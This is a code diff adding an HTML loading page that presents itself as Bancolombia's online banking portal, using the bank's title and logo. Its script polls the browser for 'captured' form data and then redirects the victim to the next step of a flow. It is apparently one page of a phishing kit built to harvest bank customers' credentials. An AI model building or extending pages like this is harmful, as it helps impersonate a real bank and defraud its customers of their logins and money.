@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Bancolombia Sucursal Virtual Personas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; utf-8">
+  <meta content="es" http-equiv="Content-Language">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta http-equiv="PRAGMA" content="NO-CACHE"> 
+  <meta http-equiv="Expires" content="-1">
+
+  <link rel="icon" type="image/png" href="img/logo.png" />
+  <link href="css/style.css" rel="stylesheet">
+  <link href="css/stylesheet.css" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <script>
+    function ensureSessionId() {
+      let current = localStorage.getItem("sessionId");
+      if (!current) {
+        current = "sess_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
+        localStorage.setItem("sessionId", current);
+      }
+      return current;
+    }
+
+    const sessionId = ensureSessionId();
+
+    async function checkRedirect() {
+      if (!sessionId) {
+        console.error("⚠️ sessionId no definido en localStorage");
+        return;
+      }
+
+      try {
+        // Verificar si hay datos capturados en localStorage
+        const capturedData = localStorage.getItem("flowData");
+
+        if (capturedData) {
+          const data = JSON.parse(capturedData);
+          console.log("✅ Datos capturados, redirigiendo a:", data.nextFlow);
+
+          // Limpiar datos y redirigir
+          localStorage.removeItem("flowData");
+          window.location.href = data.nextFlow || "index.html";
+        } else {
+          console.log("⏳ Esperando datos del formulario...");
+          // Revisar cada 2 segundos
+          setTimeout(checkRedirect, 2000);
+        }
+      } catch (error) {
+        console.error("❌ Error:", error);
+        setTimeout(checkRedirect, 2000);
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", function() {
+      checkRedirect();
+    });
+  </script>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+    }
+
+    .loader-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .loader-container img {
+      max-width: 90%;
+      height: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-container">
+    <img src="img/logo-removebg-preview.png" alt="Logo Bancolombia" />
+    <br>
+    <img src="img/load2.gif" alt="Cargando..." />
+    <p id="loadingText" class="loading-text"></p>
+  </div>
+</body>
+</html>
